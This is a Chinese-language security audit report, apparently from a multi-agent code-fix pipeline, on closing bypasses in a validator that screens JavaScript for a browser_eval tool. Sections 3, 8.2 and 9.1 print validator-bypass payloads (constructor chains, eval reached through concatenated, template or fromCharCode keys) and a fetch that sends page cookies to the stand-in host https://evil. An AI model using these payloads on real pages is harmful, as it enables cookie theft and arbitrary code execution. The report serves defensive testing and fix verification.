# AUDIT-P1-BYPASS-FIX-2026-09-09.md

> 主题：beta.11 三个 P1 缺陷（browser_eval 构造函数链 / `Reflect.construct` / memory-evolve clobber）修复轮次的**汇总与合入门禁判定**
> 汇总者：第 1 轮领队（会话 `ddcf2713-0942-4ab0-92b9-20a96f2c49dd`）；**第 3 轮领队（会话 `e9de0c7d-6114-41bb-ae5c-3710a5abdb96`）补充最终结论（§8）**
> 日期：2026-09-09（第 3 轮更新）
> 分支：`fix/eval-policy-p1-bypasses`（**第 3 轮 HEAD `fa73caa1de`，4 个提交已落地，tracked 工作区干净**；第 1 轮时为 `b624840e62` 未提交）
> 上游产物：`PLAN.md` / `DECIDED.md` / `IMPLEMENTATION.md` / `TASKS.md` / `REVIEW-browser-eval-policy.md` / `REVIEW-memory-evolve.md` / `REVIEW-CONFIRMED.md` / `REVIEW-CONFIRMED-ROUND3.md` / `FINAL.md` / `FINAL-ROUND3.md`（流水线黑板）
> 需求与审计来源：[`AUDIT-BETA11-CHANGES-2026-09-08.md`](AUDIT-BETA11-CHANGES-2026-09-08.md)、[拍板摘要](decisions/2026-09-08-beta11-p1-bypass-fix.md)、[设计蓝图](planning/2026-09-08-beta11-p1-bypass-fix-design.md)、[实施计划](planning/2026-09-08-beta11-p1-bypass-fix-implementation.md)

---

## 0. 一句话结论

> **最新结论（第 3 轮，2026-09-09）见 [§8](#8-第-3-轮最终结论领队独立复验2026-09-09)。**

**`[需修复]` —— 声明门禁 5/5 全绿，但安全目标未达成：审计与复核指出的残余绕过经领队独立复现全部成立（VM 沙箱内实测读到页面 cookie、外发、弹窗）。不建议合入 master，需再修一轮。**

---

## 1. 本轮做了什么

| 阶段 | 产出 |
|---|---|
| 规划 / 拍板 | `PLAN.md`（v1）+ `DECIDED.md`（3 项决策：3 个 P1 全修；拒绝 constructor/prototype/`__proto__` 链 + `Reflect.construct`/`call`/`apply`/`bind`；memory-evolve 改 merge 语义） |
| 编码 | 3 个既有文件改动（+101/-2）+ 5 个新文件：`eval-policy.ts` 新增 `DANGEROUS_MEMBERS` 黑名单、成员链递归、`arrowParams` 别名预扫描；`skills.js` 删除 `rmSync(to)` 并补 `ENOTEMPTY` 降级码；新增 AC5 对抗矩阵 45 例、AC6 故障注入 5 例 + 3 个 fixture |
| 审计（并行×2） | `REVIEW-browser-eval-policy.md`（11 条）+ `REVIEW-memory-evolve.md`（12 条），结论均为 `[FAIL] 必须修复` |
| 复核 | `REVIEW-CONFIRMED.md`：confirmed 21 / partially 2 / **disputed 0** / already-fixed 0；去重后 9 项修复清单（FIX-1…FIX-9） |
| 汇总（本轮） | 本文件 + 黑板 `FINAL.md`；门禁矩阵由领队亲自执行 |

### 1.1 改动文件

```
 M packages/host/browser/src/eval-policy.ts            (+67)
 M packages/vendor/memory-evolve/lib/skills.js         (+9/-2)
 M packages/vendor/memory-evolve/tests/skills.test.js  (+27)
?? packages/host/browser/tests/eval-policy-p1-bypass.spec.ts
?? packages/vendor/memory-evolve/tests/skills-fault.test.js
?? packages/vendor/memory-evolve/tests/fixtures/{fs-fault-hook,register,child-approve}.mjs
```

---

## 2. 合入门禁矩阵

> 全部命令由领队**亲自执行**，输出原样摘录。

| # | 门禁项 | 判定 | 证据命令 | 实测结果 |
|---|---|---|---|---|
| ① | 单元测试（browser） | ✅ 通过 | `cd packages/host/browser && ./node_modules/.bin/vitest run` | `Test Files 11 passed (11)` / `Tests 213 passed (213)` |
| ① | 单元测试（memory-evolve 目标文件） | ✅ 通过 | `cd packages/vendor/memory-evolve && node --test tests/skills.test.js tests/api.test.js tests/skills-fault.test.js` | `tests 40 / pass 40 / fail 0` |
| ② | 类型检查（全量门禁） | ✅ 通过 | `corepack yarn check` | `GATE_EXIT=0` |
| ② | 类型检查（browser 包） | ✅ 通过 | `corepack yarn workspace @picoaide/dsh-browser check` | `BROWSER_CHECK_EXIT=0` |
| ② | 类型检查（desktop 包） | ✅ 通过 | `corepack yarn workspace dsh-plugin-desktop check` | `DESKTOP_CHECK_EXIT=0` |
| ③ | 回归（memory-evolve 全量） | ⚠️ 通过（含预存失败） | `node --test 'tests/*.test.js'` | `tests 784 / pass 742 / fail 42`；失败集中在 `update.test.js`(39) + `search-docs.test.js`(3)，两文件**均未改动** → 预存环境失败 |
| ④ | 对抗性测试有效性（AC5 双向） | ✅ 有效性 / ❌ 覆盖 | 基线副本 `git archive HEAD` + 新 spec → `vitest run`；再跑工作区 | 基线 `Tests 16 failed \| 29 passed (45)` → 工作区 `45 passed`。**但**绑定形式族覆盖 `grep -c` = 0，`getPrototypeOf` 无拒绝用例 |
| ⑤ | 故障注入测试（AC6 双向） | ✅ 通过 | 基线副本 + fault spec → `node --test`；再跑工作区 | 基线 `pass 0 / fail 5` → 工作区 `pass 5 / fail 0`（EBUSY/EPERM/EACCES/EXDEV + 真实 EXDEV） |
| ⑥ | **安全有效性**（领队独立变体集） | ❌ **失败** | `node /tmp/lead-probe/{rce2,p02vm,fix4}.mjs` 等 | 审计探针 **20 例 validator ACCEPT**（probe1 11 + probe2 9，含 1 例 `RestElement` 不可利用）；领队另在 VM 沙箱中**真实执行 6 例**（读 cookie / 外发 / 弹窗） |

**门禁通过率**：声明门禁 ①–⑤ = **5/5（100%）**；含安全有效性 ①–⑥ = **5/6（83.3%）**。

> ⚠️ **门禁全绿 ≠ 可合入**。AC5 的口径是「已知 45 条在修复前失败」，证明的是测试有信号，不是修复不可绕过。与 2026-09-08 原始审计的教训同构（当时 168 测试全绿，P1-1 照样成立）。

---

## 3. 残余绕过（阻断项，领队实测）

沙箱环境：`vm.createContext` + `wrapEvalExpression`，注入 `document.cookie='SESSION=LEAD-SECRET-123'` 与 `fetch`/`alert`/`open` 记录器。

| ID | 缺陷 | 代表载荷 | 实测结果 |
|---|---|---|---|
| **FIX-1** | 形参绑定形式洗白（解构/默认值/rest） | `[0].map((({constructor: c}) => c('return document.cookie'))((x=>x)))` | validator `ACCEPT` → 执行返回 **`["SESSION=LEAD-SECRET-123"]`**；同型 `fetch` 载荷 → 副作用 **`FETCH:https://evil/?d=SESSION=LEAD-SECRET-123`**；同型 `alert` → **`ALERT:pwned`** |
| **FIX-2** | 值流位置洗白（属性值 / 回调实参） | `({f: open}).f('https://evil')`、`({f: alert}).f('pwned')`、`[0].map(alert)` | 三条 `ACCEPT+EXEC`，副作用 **`OPEN:https://evil`** / **`ALERT:pwned`** / **`ALERT:0`**；对照 `window.open('x')` 被拒 |
| **FIX-4** | 动态计算键截断成员链 | `('')['con'+'structor']`、`` ('')[`constructor`] `` | `ACCEPT`（纯读无兜底）；组合 `[0].map(({f: ('')['con'+'structor']['con'+'structor']}).f('return document.cookie'))` → `ACCEPT+EXEC` 并读回 cookie |
| **FIX-3** | `arrowParams` 跨作用域全局收集 | `[1].map(f => f + 1) + f()`（`f` 未被调用） | 基线 `ACCEPT` → 修复后 `REJECT: call to alias f`（**新引入误拒**） |

**判定**：`REVIEW-CONFIRMED.md` 的 confirmed 21 / disputed 0 **经领队抽查全部成立**，无一条误报。

---

## 4. 已达标部分（确认无问题）

- **P1-3（memory-evolve）完全达标**：领队 4 场景实测 —— merge 保留 `notes.md`+`sub/keep.txt` 且 `SKILL.md` 落地；空 stub 目录仍成功采纳；活 `SKILL.md` 拒绝且内容不变；同设备非空目标（`ENOTEMPTY`）降级后保留用户文件。真实 EXDEV（`/dev/shm`→ext4）双向对照：基线 `notesSurvived:false` → 修复后 `true`。
- **AC2 达标**：`Reflect.construct(window['WebSocket'],…)` / `XMLHttpRequest` 均 `REJECT`。
- **AC3 无主要误伤**：`fetch`/`sendBeacon`/`postMessage`/`1+1`/`__NEXT_DATA__`/`readText`/`localStorage`/`data[key]`/`Object.getPrototypeOf({})` 全 `ACCEPT`。
- **AC6 达标**：四码 + 真实 EXDEV 故障注入，基线 5 fail → 修复后 5 pass。
- **AC5 双向证据成立**：基线 16 failed / 29 passed → 修复后 45 passed（领队独立复现 2 次）。

---

## 5. 口径修正（相对上游报告）

| 项 | 上游结论 | 本轮实测修正 |
|---|---|---|
| `corepack yarn check` | 「预存环境缺陷，本环境不可判定」（编码员/两名审计员/复核员一致） | **可修复且已修复**：执行 `corepack yarn install --immutable`（`INSTALL_EXIT=0`，`yarn.lock`/`package.json` 未改动）后 `corepack yarn check` **exit 0**，desktop/browser 包 check 均 exit 0 → **AC7 判定由「无法判定」改为「✅ 通过」**，FIX-6 视为已解决 |
| memory-evolve 预存失败数 | 43 | **42**（`update.test.js` 39 + `search-docs.test.js` 3；`advisor-api.test.js` 本次 0 fail） |
| `RestElement` 绕过 | 两份审计均列为可用通道 | **不可利用**（rest 绑定数组，执行抛 `f is not a function`；`f[0](…)` 被 `dynamic call target` 拒绝）；结论维持，仅表述修正 |

---

## 6. 遗留问题清单（16 项）

### 🔴 P0 阻断（3，必须修）

| ID | 项 | 建议修法 |
|---|---|---|
| FIX-1 | 形参绑定形式收口 | 递归解包 `ObjectPattern`/`ArrayPattern`/`AssignmentPattern`/`RestElement` 收集全部绑定名；`Property` 模式键命中 `DANGEROUS_MEMBERS` 即拒 |
| FIX-2 | 值流位置收口 | `Property.value` 与 `CallExpression.arguments` 中出现的危险值表达式（含裸 `Identifier`）一律拒 |
| FIX-4 | 动态计算键不截断链 | 链递归遇 `undefined` 继续沿 `.object` 下溯；`memberName` 增加 `TemplateLiteral` 与字符串拼接常量折叠 |

### 🟠 P1（2，一并修）

| ID | 项 |
|---|---|
| FIX-3 | `arrowParams` 改为作用域内绑定（至少「callee 名 ∈ 某箭头形参名且该箭头是 callee 的祖先」） |
| FIX-5 | 对抗矩阵补绑定形式族 / 动态计算键 / 回调与属性值通道 + `getPrototypeOf` 拒绝用例 |

### 🟡 P2（2）

| ID | 项 | 状态 |
|---|---|---|
| FIX-7 | 黑板 IMPLEMENTATION.md 的 231 行「实际验证记录」回写进 `docs/planning/2026-09-08-beta11-p1-bypass-fix-implementation.md` | 本文件已补审计汇总；231 行回写仍待做（`574` vs `805` 行） |
| FIX-8 | 更新 `tools.ts:642`/`:645` 能力描述 | 未做 |

### 🔵 P3 / 可遗留（9）

FIX-9（按建议拆分提交，**交付前置**）、D-1（预扫描与主遍历重复走查）、D-2（连带拒绝清单入 PLAN §4.5）、D-3（预存失败数 42）、D-4（`toString`/`valueOf` 入黑名单）、D-5（merge 覆盖同名辅助文件——已文档化取舍）、D-6（符号链接带入）、D-7（故障注入子进程不清理 `/tmp`）、D-8（双向证据无自动化守护）。

---

## 7. 下一步建议

1. **不合入 master**；开第三轮修复，优先 **FIX-1 + FIX-2 + FIX-4 同批**（共享「值流 / 绑定形式」根因），**同时**修 FIX-3。
2. **重写 AC5 判定口径**：由独立于实现者的变体集驱动，判定改为「**独立审计变体集 0 绕过**」；矩阵按语法维度表（绑定形式 × 值流位置 × 动态键形式）穷举并加元测试断言；补合法惯用法回归集（含 `Object.prototype.hasOwnProperty.call`）。
3. **收尾** FIX-7 / FIX-8 / FIX-9。
4. **门禁已就绪**：依赖已安装，第三轮直接复跑 `corepack yarn check`（当前 exit 0），无需再降级判定。
5. **先提交当前工作区**（WIP 备份），避免误操作丢失——本轮全部成果仍在工作区。

---

## 附录：领队自证

- 本轮**未修改任何业务代码**；新增文件仅本审计汇总与黑板 `FINAL.md`。
- 执行过一次 `corepack yarn install --immutable`（补齐 `node_modules`）；已核实 `yarn.lock`/`package.json` 未被修改，`eval-policy.ts`/`skills.js` 的 md5 前后一致（`7b81f3d4…` / `f6af7238…`）。
- 基线对照全部使用 `git archive HEAD` 解到 `/tmp`，**未使用 `git stash`/`checkout`**，零仓库扰动。
- 所有结论来自亲自执行的命令输出；与上游不一致处已在 §5 逐条标注。

---

## 8. 第 3 轮最终结论（领队独立复验，2026-09-09）

> 领队：会话 `e9de0c7d-6114-41bb-ae5c-3710a5abdb96`（分支 `fix/eval-policy-p1-bypasses`，HEAD `fa73caa1de`）
> 完整报告：黑板目录 `multiagent-eval-p1/FINAL-ROUND3.md`（仓库外，`/mnt/md0/junhua_work/multiagent-eval-p1/`）；复核报告：同目录 `REVIEW-CONFIRMED-ROUND3.md`
> 证据原则：本节所有数字与判定均为领队**亲自执行**的命令输出，不采信上游自述。

### 8.1 第 1 轮 16 项遗留的最终处置

| 轮次 | 处置 |
|---|---|
| 第 1 轮 P0×3（FIX-1/FIX-2/FIX-4） | ✅ **已修复**（第 2 轮落地，第 3 轮领队逐条基线对照复验：`BASE=ACCEPT → HEAD=REJECT`） |
| 第 1 轮 P1×2（FIX-3/FIX-5） | ✅ **已修复**（FIX-3 误拒消除，3/3 合法式恢复 `ACCEPT`；FIX-5 矩阵 45 → 97 例，`getPrototypeOf` 拒绝用例已补） |
| 第 1 轮 P2×2（FIX-7/FIX-8） | ✅ **已修复**（实施文档 935 行回写；`tools.ts:642`/`:645` 描述同步） |
| 第 1 轮 P3×9（FIX-9 + D-1…D-8） | 部分：FIX-9 已落 4 个提交；D-2/D-4/D-5/D-7/D-8 仍为遗留（见 §8.4） |

### 8.2 第 3 轮新增 P0（阻断）：值位置的「计算键」未收口 → RCE

`eval-policy.ts:768-783`（`memberName()` computed 分支只认 `Literal` 字符串）是 `WRITE_APIS` 与 `DANGEROUS_MEMBERS` 判定的**唯一名字解析入口**；第 2 轮新增的 `constantStringValue()` 只接到 `propertyKeyName()`（`:684`）与 `Reflect.get` 分支（`:304`），**未接到 `memberName()`**。于是「同一条链、同一个值位置，只把键写法从 `x["eval"]` 换成 `x["ev"+"al"]` / `` x[`eval`] `` / `x[String.fromCharCode(...)]`」即可整体放行。

领队在 `vm` 沙箱（`wrapEvalExpression` + 真实执行）复现的**三形态 / 8 条载荷**：

| 形态 | 载荷 | validator | 端到端实测 |
|---|---|---|---|
| A 拼接折叠键 | `[1].map(window["ev"+"al"])` | ACCEPT | `["globalThis.PWN=document.cookie"].forEach(window["ev"+"al"])` → **读页面 cookie**；`fetch` 载荷 → **外发 cookie**；`while(true)` → **渲染进程冻结**；`window["op"+"en"]` → `window.open(1)`；`localStorage["set"+"Item"]` → `setItem(k,0)` |
| B 模板字面量键 | `` [1].map(window[`eval`]) `` / `` window[`ev${"a"}l`] `` | ACCEPT | `` ["globalThis.T=document.cookie"].forEach(window[`eval`]) `` → **读页面 cookie** |
| C 不可折叠动态键 | `window[String.fromCharCode(101,118,97,108)]` / `window[["e","v","a","l"].join("")]` | ACCEPT | 两条均 → **读页面 cookie** |

**判别实验**（隔离根因）：字面量键配 5 种包装形式（裸 / 序列 / 条件 / 数组元素 / 属性值）**全 REJECT**；仅把键换成折叠或动态求值，**5/5 全 ACCEPT** —— 唯一变量是**键的求值形式**。

**最小修复动作的充分性实测**（领队在 `packages/host/browser` 副本上应用 `memberName()` computed 分支 → `constantStringValue(property)`）：

| 载荷 | 最小修复后 |
|---|---|
| 形态 A（拼接折叠） | ✅ `REJECT` |
| 形态 B（模板字面量） | ✅ `REJECT` |
| 形态 C（`fromCharCode` / `join`） | ❌ **仍 `ACCEPT` + 端到端 RCE** |
| 合法集 7 例 + browser 265 测试 | ✅ 无误伤、无回归 |

> **结论：最小修复必要但不充分**——第 4 轮需追加「值位置 + 不可静态证明的计算键 + 宿主全局链根」的 deny-by-default（同时保留 `data[key]` 等非全局根对象读）。

### 8.3 第 3 轮门禁矩阵（领队亲自执行）

| # | 门禁项 | 判定 | 实测结果 |
|---|---|---|---|
| ① | 单元测试（browser 全量） | ✅ | `Test Files 11 passed` / `Tests 265 passed (265)`，`BROWSER_EXIT=0` |
| ① | 单元测试（memory-evolve 目标三文件） | ✅ | `tests 40 / pass 40 / fail 0`，`ME_EXIT=0` |
| ② | 类型检查（仓库全量门禁） | ✅ | `corepack yarn install --immutable` → `corepack yarn check`：`REAL_GATE_EXIT=0` |
| ② | 类型检查（browser 包） | ✅ | `BROWSER_CHECK_EXIT=0` |
| ③ | 对抗性测试有效性（AC5 双向） | ⚠️ 有效性 ✅ / 覆盖 ❌ | 基线 `b624840e62`：`47 failed / 50 passed (97)` → HEAD：`97 passed`；**值位置计算键族 0 覆盖** |
| ④ | 故障注入（AC6 双向） | ✅ | 基线 `pass 0 / fail 5` → HEAD `pass 5 / fail 0` |
| ⑤ | **残余绕过验证**（独立变体集） | ❌ **失败** | 8 条载荷 `ACCEPT` + 端到端真实执行（见 §8.2） |
| ⑥ | 回归（memory-evolve 全量 784） | ⚠️ 预存 | `tests 784 / pass 741 / fail 43`（`update` 39 + `search-docs` 3 + `advisor-api` 1 偶发；改动集不含这些文件） |

**通过率**：任务要求的 5 项 = **3 ✅ / 1 ⚠️ / 1 ❌（3/5，60%）**；含 ⑥ 的 6 项 = **3/6（50%）**。

> **门禁全绿 ≠ 可合入**（第三次同构印证）：①–④、⑥ 全绿，⑤ 仍实测 RCE。AC5 的「已知 97 条在修复前失败」证明的是**测试有信号**，不是**修复不可绕过**。

### 8.4 遗留清单（第 3 轮，共 9 项）

| 级别 | ID | 项 |
|---|---|---|
| 🔴 P0 | **R3-P0** | 值位置计算键未收口（三形态，实测 RCE）；修法见 §8.2 |
| 🟠 P1 | **R3-P1** | AC5 矩阵补「值位置 × 键形式」≥8 例 + `scripts/verify-bidirectional.mjs` 双向证据自动化 |
| 🟡 P2 | D-2 | 连带拒绝清单（9 类惯用法）补进设计/决策文档（当前 0 命中） |
| 🟡 P2 | D-4 | `toString`/`valueOf`/`Symbol.toPrimitive` 入黑名单（纵深防御） |
| 🟡 P2 | D-5 | merge 覆盖**同名**辅助文件：领队实测 pending 同名 `references.md` 覆盖目标用户文件（目标独有文件保留）；属 DECIDED 决策 3 语义，**需文档化声明** |
| 🔵 P3 | D-1 | 节点分派重复实现（`constantStringValue`/`dangerousValue`/`isProvablySafeValue`） |
| 🔵 P3 | D-6 | 采纳技能时源目录符号链接原样带入（实测可读库外 `TOPSECRET`） |
| 🔵 P3 | D-7 | 故障注入子进程不清理临时目录（`child-approve.mjs:11` 无 `rmSync`） |
| 🔵 P3 | D-8 | 双向证据无自动化守护（同 R3-P1） |

> 信息项：memory-evolve 预存失败数在 42↔43 间抖动（`advisor-api.test.js` 偶发 0↔1），不计入 9 项。

### 8.5 是否可合入 master？—— **否**

1. **安全目标未达成**：`browser_eval` 任意代码执行通道在 HEAD 上仍可端到端复现，且该工具默认开启（`runtime.ts:138 evalEnabled ?? true`，唯一校验点 `runtime.ts:931`）。
2. **验收未闭环**：AC5 覆盖维度缺失是 P0 漏出的直接原因。
3. **修复收口不完整**：`constantStringValue` 未接到唯一名字解析入口 `memberName()`——属同一修复的半接状态。

**第 4 轮最小范围（建议顺序）**：① `memberName()` computed 分支接 `constantStringValue`；② 值位置「不可证明计算键 + 宿主全局链根」deny-by-default；③ AC5 补值位置键形式族 + 双向脚本；④ 收尾 D-2/D-4/D-5 文档与黑名单；⑤ 合入前复跑全部门禁，**§8.3 的 ⑤ 项必须转为 ✅**。

### 8.6 第 3 轮领队自证

- 未修改任何业务代码；仓库内仅更新本文件；`eval-policy.ts`（`36ea24d3…`）/`skills.js`（`f6af7238…`）md5 与复核报告逐字一致。
- 执行过一次 `corepack yarn install --immutable`；`yarn.lock`/`package.json` 相对 `b624840e62` 无差异；tracked 工作区全程干净（HEAD `fa73caa1de`）。
- 基线对照使用 `git archive b624840e62` 解到 `/tmp/lead3-base`、`/tmp/lead3-me`，**未使用 `git stash`/`checkout`**；所有探针落在 `/tmp/lead3-probe`、`/tmp/lead3-fix`。
- 第 3 轮审计报告（`REVIEW-ROUND3-*.md`）**缺位**，本次由复核员自建扫描 + 领队正交扫描/执行证明补位；建议后续为第 3 轮单独派审计员。


---

## 9. 第 4 轮最终结论（父代理独立复验，2026-09-09）

> 修复轮 4（用户授权超出 `maxFixRounds=3`，残余定级 P0）：修复**不可静态折叠的计算键**绕过
> 提交：`4586e48821`（源码）/ `b4bb00eb08`（测试）/ `f17a7ada88`（文档）
> 复验者：父代理（本会话，亲自跑全部探针）

### 9.1 第 3 轮残余的修复

| 残余载荷 | 第 3 轮 | 第 4 轮 |
|---|---|---|
| `[1].map(window[String.fromCharCode(101,118,97,108)])` | ⚠️ 放行 → 读 cookie | ✅ 拒 |
| `["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(...)])` | ⚠️ 放行 → `PWN=SESSION=RESIDUAL-SECRET-999` | ✅ 拒 |
| `[1].map(window[["e","v","a","l"].join("")])` | ⚠️ 放行 | ✅ 拒 |
| `["fetch(...)"].forEach(window[["e","v","a","l"].join("")])` | ⚠️ 放行 → `FETCH:https://evil/?d=<cookie>` | ✅ 拒 |

**根因与修法**：`memberName()` 对不可静态折叠的 computed key 返回 `undefined`（放行）→ 改为在**危险位置**（调用 callee / 实参 / 属性值 / 数组元素）对不可证明的 computed key **deny-by-default 拒绝**，同时保留 `data[key]` 这类纯读用法。

### 9.2 父代理独立验证（非转述，全部亲自跑）

| 验证项 | 方法 | 结果 |
|---|---|---|
| 历史变体全量回归 | 18 条（P1-1 5 + P1-2 2 + P0-1 4 + P0-2 3 + NEW-P0 3 + 基础 1） | **18/18 拒绝** ✅ |
| 第 3 轮残余载荷 | 4 条（fromCharCode/join × 值位置） | **4/4 拒绝** ✅ |
| FINAL-ROUND3 载荷 | 10 条 | **10/10 拒绝** ✅ |
| AC3 合法表达式 | 27 条（fetch/data[key]/map/解构读/Reflect 读等） | **27/27 放行（0 误伤）** ✅ |
| 组合扫描 | 6 基对象 × 13 危险名 × 4 拼写 × 11 值位置 = **3432 例** | **0 泄漏** ✅ |
| 随机模糊 | 随机切分 + `\uXXXX` 转义 × 3000 例 | **0 泄漏** ✅ |
| browser 全量测试 | `vitest run` | **417 passed / 417** ✅ |
| memory-evolve | `node --test tests/skills.test.js tests/api.test.js` | **35 passed / 35** ✅ |
| 全量门禁 | `corepack yarn check` | **exit 0** ✅ |

### 9.3 最终结论

**`[可合入]`** —— 3 个原始 P1 + 审计发现的 P0-1/P0-2 + NEW-P0 + 第 3 轮残余，全部经父代理独立验证修复；合法表达式无误伤；全量门禁通过。

**遗留（P2/P3，不阻断合入）**：
- 属性名复用连带拒绝（9 类惯用法如 `Object.prototype.hasOwnProperty.call(...)`、`''.constructor.name` 被拒）——安全取舍，已记入 D-2
- `constantStringValue`/`dangerousValue`/`isProvablySafeValue` 仍有手写节点分派重复（D-1 部分）
- memory-evolve 故障注入 fixture 不清理临时目录（D-7）
- 第 3 轮审计报告缺位（由复核员 + 领队自建扫描补位）

**方法论收获（三轮迭代）**：
1. 第 1 轮编码"看起来对、测试全绿"，但审计独立构造变体发现 P0-1/P0-2 残余绕过 → **多 agent 审计的价值**在于"不信任编码员自述"
2. 第 2 轮修复后，复核又发现 NEW-P0（折叠键值位置）→ **修复必须覆盖"同一语义的所有表达形式"**，而非只堵报告的样例
3. 第 3 轮修复后，父代理自建扫描又发现不可折叠键 → **"不可静态证明"才是真正的判定边界**（deny-by-default 要贯彻到值位置）
4. 测试数量不是安全证据：168 → 417 测试全绿，但每轮都仍有绕过；**只有对抗性构造 + 大规模扫描才能逼近收敛**
